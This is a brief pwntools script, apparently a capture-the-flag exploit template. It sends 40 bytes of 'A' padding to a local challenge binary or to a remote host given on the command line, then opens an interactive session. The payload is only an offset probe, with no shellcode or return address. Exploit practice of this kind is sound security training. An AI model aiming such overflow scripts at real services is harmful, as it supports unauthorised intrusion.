from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


exe = "./chall"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "debug"

io = start()
offset = 40
payload = flat(b"A" * offset)

io.sendline(payload)
io.interactive()